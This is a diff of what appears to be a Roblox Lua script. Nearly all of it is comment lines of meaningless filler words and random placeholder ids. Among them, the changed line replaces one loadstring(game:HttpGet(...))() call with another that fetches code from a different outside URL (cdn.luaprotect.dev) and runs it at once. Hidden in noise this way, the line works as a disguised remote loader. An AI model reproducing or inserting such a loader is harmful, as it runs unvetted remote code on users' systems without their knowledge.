@@ -623,7 +623,7 @@
 -- resource metadata worker network engine validation module config parameter asset release placeholder_ymvn2hg6km6v8r status_inactive mode_test channel_release profile_default temporary_data configuration
 -- operation runtime registry build parameter profile resource handler process temporary state placeholder_rjeda84wxlotim status_inactive mode_test channel_release profile_default temporary_data configuration
 -- queue parameter debug process resource network runtime profile monitor internal worker placeholder_0kcc83cgl2il9z
-loadstring(game:HttpGet("https://roomcord.dpdns.org/api/loader?id=xdmxvBuF"))()
+loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/1e3b8c/lwrsvIEAJhwv1URh"))()
 -- temporary workspace module internal queue metadata process environment engine handler runtime placeholder_ik3kgvneyqoody status_inactive mode_test channel_release profile_default temporary_data configuration
 -- temporary manager interface process build system service connection operation workspace server placeholder_isg3v0f3jwvfxs status_inactive mode_test channel_release profile_default temporary_data configuration
 -- diagnostic debug interface service operation component parameter runtime controller network server placeholder_qpj7qvy1zonf65 status_inactive mode_test channel_release profile_default temporary_data configuration
